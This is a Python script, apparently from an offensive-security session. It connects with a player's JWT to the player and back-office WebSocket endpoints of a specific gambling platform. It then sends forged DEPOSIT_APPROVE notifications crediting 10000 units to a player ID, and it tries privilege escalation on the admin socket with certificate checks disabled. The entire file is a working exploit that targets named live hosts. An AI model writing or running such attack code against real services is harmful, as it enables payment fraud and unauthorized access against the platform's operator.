#!/usr/bin/env python3
"""probe_ws_notify.py — Connect to platform WebSocket and send deposit notification.

   From JS: wss://{domain} with token from luxino._token.local cookie.
   WebSocket receives {data, notification, topic_name} messages.

   ATTACK: If player JWT allows WS connection, try sending DEPOSIT_APPROVE
   or deposit notification messages that the platform processes.
"""
import json, pathlib, time, ssl, threading

try:
    import websocket
except ImportError:
    import subprocess, sys
    subprocess.check_call([sys.executable, "-m", "pip", "install", "websocket-client", "-q"])
    import websocket

TID    = "af6efb584a3d317b5a11ab6209b88e1b"
JWT    = pathlib.Path("/home/kzp/claude-red/.jwt.vak88z2").read_text().strip()
PLAYER_UID = "eea830ab-b187-4f21-9b79-28e2773b2f6b"

# WS URLs from JS bundle analysis:
# - Player WS: /pb/ws on pbapi (from core.js)
# - BO WS: /bo/ws on bgapi (from 3bdb0c1.js)
# Format: wss://{host}?token={jwt}  OR  wss://{wsBaseUrl}?token={jwt}
WS_URLS = [
    # Player WS — most likely to accept player JWT
    f"wss://{TID}pbapi.asdgapicenterssdo.com/pb/ws?token={JWT}",
    f"wss://{TID}pbapi.asdgapicenterssdo.com/pb/ws",
    # BO WS — try player JWT for priv-esc
    f"wss://{TID}bgapi.asdgapicenterssdo.com/bo/ws?token={JWT}",
    f"wss://{TID}bgapi.asdgapicenterssdo.com/bo/ws",
    # mgapi WS
    f"wss://{TID}mgapi.asdgapicenterssdo.com?token={JWT}",
    f"wss://{TID}mgapi.asdgapicenterssdo.com/ws?token={JWT}",
]

# Deposit notification messages using topic_name from JS
DEPOSIT_MSGS = [
    # Known topic names from JS analysis
    {"topic_name": "DEPOSIT_APPROVE", "data": {"user_id": PLAYER_UID, "amount": 10000, "status": "success"}},
    {"topic_name": "TRANSACTION_DEPOSIT_APPROVE", "data": {"user_id": PLAYER_UID, "amount": 10000}},
    # Notification array format matching JS: {notification: [{type, is_read}], data, topic_name}
    {"notification": [{"type": "DEPOSIT_APPROVE", "is_read": False}],
     "data": {"user_id": PLAYER_UID, "amount": 10000, "status": "success"},
     "topic_name": "DEPOSIT_APPROVE"},
    # Direct action
    {"action": "DEPOSIT_APPROVE", "user_id": PLAYER_UID, "amount": 10000},
    {"type": "DEPOSIT_APPROVE", "user_id": PLAYER_UID, "amount": 10000},
]

def try_ws(url, timeout=8):
    """Try connecting to WS, send auth + deposit msgs, return messages received."""
    received = []
    connected = threading.Event()
    done = threading.Event()

    def on_open(ws):
        connected.set()
        print(f"  [OPEN] Connected to {url[:80]}")
        # Send auth
        try:
            ws.send(json.dumps({"token": JWT}))
            time.sleep(0.5)
            ws.send(json.dumps({"authorization": f"Bearer {JWT}"}))
            time.sleep(0.3)
        except Exception as e:
            print(f"  [SEND_ERR] {e}")
        # Send deposit msgs
        for msg in DEPOSIT_MSGS[:4]:
            try:
                ws.send(msg if isinstance(msg, str) else json.dumps(msg))
                time.sleep(0.2)
            except Exception:
                pass
        time.sleep(1.5)
        ws.close()

    def on_message(ws, message):
        received.append(message)
        print(f"  [MSG] {str(message)[:300]}")

    def on_error(ws, error):
        if "refused" not in str(error).lower() and "No route" not in str(error):
            print(f"  [ERR] {str(error)[:100]}")
        done.set()

    def on_close(ws, code, msg):
        done.set()

    ws_app = websocket.WebSocketApp(
        url,
        header=[f"Authorization: Bearer {JWT}",
                "Origin: https://manage.vak88z2.com"],
        on_open=on_open,
        on_message=on_message,
        on_error=on_error,
        on_close=on_close,
    )

    t = threading.Thread(target=ws_app.run_forever,
                         kwargs={"sslopt": {"cert_reqs": ssl.CERT_NONE}},
                         daemon=True)
    t.start()
    done.wait(timeout=timeout)
    ws_app.close()
    return received

print("=== WebSocket probe ===")
print(f"JWT sub: eea830ab (player)")

for url in WS_URLS:
    print(f"\nTrying: {url[:80]}")
    msgs = try_ws(url, timeout=6)
    if msgs:
        print(f"  [!!!] Received {len(msgs)} messages!")
        for m in msgs:
            print(f"  {str(m)[:300]}")
    else:
        print(f"  No messages (connection refused/closed)")

print("\n=== Done ===")
